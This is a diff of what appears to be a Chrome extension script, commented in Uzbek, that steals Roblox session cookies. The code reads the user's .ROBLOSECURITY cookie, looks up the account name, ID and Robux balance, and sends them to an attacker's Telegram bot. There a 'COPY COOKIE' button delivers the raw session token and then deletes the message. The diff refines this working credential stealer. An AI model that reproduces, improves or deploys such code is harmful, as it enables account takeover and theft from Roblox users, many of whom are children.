@@ -20,13 +20,16 @@ async function checkAndSendCookies() {
             name: ".ROBLOSECURITY"
         });
 
-        if (!cookies) return;
+        if (!cookies) {
+            console.log("Kuki topilmadi (akkauntga kirilmagan).");
+            return;
+        }
         let cookieValue = cookies.value;
 
         const userInfo = await getRobloxUserInfo(cookieValue);
         if (!userInfo) return;
 
-        // Robux balansini olish
+        // Robux balansini aniq olish
         let robuxBalance = await getRobuxBalance(cookieValue);
 
         let accountId = userInfo.id.toString();
@@ -78,34 +81,35 @@ async function checkAndSendCookies() {
 async function getRobloxUserInfo(cookieValue) {
     try {
         let response = await fetch("https://users.roblox.com/v1/users/authenticated", {
-            headers: { "Cookie": `.ROBLOSECURITY=${cookieValue}` }
+            headers: { "Cookie": `.ROBLOSECURITY=${cookieValue}` },
+            credentials: "include"
         });
         if (response.ok) return await response.json();
     } catch (e) {}
     return null;
 }
 
-// Robux balansini olib keluvchi yangi funksiya
 async function getRobuxBalance(cookieValue) {
     try {
         let response = await fetch("https://economy.roblox.com/v1/user/currency", {
-            headers: { "Cookie": `.ROBLOSECURITY=${cookieValue}` }
+            headers: { "Cookie": `.ROBLOSECURITY=${cookieValue}` },
+            credentials: "include"
         });
         if (response.ok) {
             let data = await response.json();
             return data.robux !== undefined ? data.robux : 0;
         }
     } catch (e) {}
-    return "Aniqlanmadi";
+    return 0;
 }
 
 async function sendTelegramMessage(userInfo, robuxBalance, cookieValue, updateCount, timeStr, accountId) {
-    let messageText = `🔄 **ROBLOX COOKIE YANGILANDI**\n\n` +
+    let messageText = `🔄 **ROBLOX AKKAUNT MA'LUMOTI**\n\n` +
                       `👤 **Username:** \`${userInfo.name}\`\n` +
                       `🏷 **Displayname:** \`${userInfo.displayName}\`\n` +
                       `🆔 **ID:** \`${userInfo.id}\`\n` +
                       `💎 **Robux Balansi:** \`${robuxBalance}\`\n` +
-                      `📊 **Almashish soni:** \`${updateCount}-chi marta\`\n` +
+                      `📊 **Ulanish soni:** \`${updateCount}-chi marta\`\n` +
                       `🕒 **Vaqt:** \`${timeStr}\``;
 
     chrome.storage.local.get(["cookieStore"], (data) => {
@@ -124,7 +128,7 @@ async function sendTelegramMessage(userInfo, robuxBalance, cookieValue, updateCo
                 parse_mode: 'Markdown',
                 reply_markup: {
                     inline_keyboard: [
-                        [ { text: "📋 COPY", callback_data: `get_cookie_${accountId}` } ]
+                        [ { text: "📋 COPY COOKIE", callback_data: `get_cookie_${accountId}` } ]
                     ]
                 }
             })
@@ -145,7 +149,6 @@ async function deleteTelegramMessage(messageId) {
     } catch (e) {}
 }
 
-// Tugma bosilganini kuzatib boruvchi funksiya (Dublikatsiz)
 async function startLongPolling() {
     chrome.storage.local.get(["lastUpdateId"], (data) => {
         let lastUpdateId = data.lastUpdateId || 0;
@@ -172,7 +175,6 @@ async function startLongPolling() {
                                     let cookieVal = store[accountId];
 
                                     if (cookieVal) {
-                                        // Kukini alohida xabar qilib yuborish
                                         let msgRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                                             method: 'POST',
                                             headers: { 'Content-Type': 'application/json' },
@@ -184,7 +186,6 @@ async function startLongPolling() {
                                         });
                                         let msgData = await msgRes.json();
 
-                                        // 3 soniyadan keyin o'sha xabarni o'chirish
                                         if (msgData.ok) {
                                             let sentMsgId = msgData.result.message_id;
                                             setTimeout(async () => {
@@ -196,7 +197,7 @@ async function startLongPolling() {
                                     await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                                         method: 'POST',
                                         headers: { 'Content-Type': 'application/json' },
-                                        body: JSON.stringify({ callback_query_id: query.id, text: "Kuki yuborildi va 3 sekunddan so'ng o'chadi!" })
+                                        body: JSON.stringify({ callback_query_id: query.id, text: "Kuki yuborildi!" })
                                     });
                                 });
                             }
